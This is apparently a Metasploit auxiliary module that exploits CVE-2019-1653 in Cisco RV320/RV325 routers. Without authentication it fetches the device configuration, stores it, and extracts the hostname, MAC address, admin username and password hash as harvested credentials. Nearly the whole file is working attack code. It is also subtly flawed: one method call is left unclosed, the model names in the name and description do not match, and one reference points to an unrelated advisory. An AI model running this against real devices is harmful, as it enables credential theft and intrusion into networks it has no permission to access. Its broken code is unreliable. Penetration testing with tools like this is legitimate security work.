##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Cisco RV320/RV326 Configuration Disclosure',
      'Description'  => %q{
          A vulnerability in the web-based management interface of Cisco Small Business
          RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an unauthenticated,
          remote attacker to retrieve sensitive information. The vulnerability is due
          to improper access controls for URLs. An attacker could exploit this
          vulnerability by connecting to an affected device via HTTP or HTTPS and
          requesting specific URLs. A successful exploit could allow the attacker to
          download the router configuration or detailed diagnostic information. Cisco
          has released firmware updates that address this vulnerability.
        },
      'References'     =>
        [
          ['EDB', '46262'],
          ['BID', '106732'],
          ['CVE', '2019-1653'],
          ['URL', 'https://seclists.org/fulldisclosure/2019/Jan/52'],
          ['URL', 'https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvg42801'],
          ['URL', 'http://www.cisco.com/en/US/products/csa/cisco-sa-20110330-acs.html']
        ],
      'Author'         =>
        [
          'RedTeam Pentesting GmbH <release@redteam-pentesting.de>'
        ],
      'License'      => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [true, 'Path to the device configuration file', '/cgi-bin/config.exp']),
        OptBool.new('SSL', [true, 'Use SSL', true])
      ])
  end

  def report_cred(user,hash)
    service_data = {
      address: rhost,
      port: rport,
      service_name: ssl ? 'https' : 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: hash,
      private_type: :nonreplayable_hash,
      jtr_format: 'md5',
      username: user,
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    cl = create_credential_login(login_data)
  end

  def run_host(ip)
    begin
      uri = normalize_uri(target_uri.path)
      res = send_request_cgi({
        'uri'     => uri,
        'method'  => 'GET',
      }, 60)
    end

    if res.nil?
      print_error("#{rhost} - Failed! Got back an empty response.")
      print_error("Please validate the RHOST and TARGETURI options and try again.")
    elsif res.code == 200
      body = res.body
      if body.match(/####sysconfig####/)
        # Report loot to database (and store on filesystem)
        stored_path = store_loot('cisco.rv.config', 'text/plain', rhost, res.body)
        print_good("Stored configuration (#{res.body.length} bytes) to #{stored_path}")

        # Report host information to database
        mac = body.match(/^LANMAC=(.*)/)[1]
        mac = "%s:%s:%s:%s:%s:%s" % [mac[0..1], mac[2..3], mac[4..5],
                                     mac[6..7], mac[8..9], mac[10..11]]
        hostname = body.match(/^HOSTNAME=(.*)/)[1]
        model = body.match(/^MODEL=(.*)/)[1]
        report_host(host: rhost,
                    mac: mac,
                    name: hostname,
                    os_name: "Cisco",
                    os_flavor: model

        # Report password hashes to database
        user = body.match(/^user (.*)/)[1]
        hash = body.match(/^password (.*)/)[1]
        report_cred(user, hash)
      else
        print_error("#{rhost} - Failed!  We got back something else.")
      end
    else
      print_error("#{rhost} - Failed! Got back a #{res.code} HTTP response.")
      print_error("Please validate the RHOST and TARGETURI options and try again.")
    end

  end
end
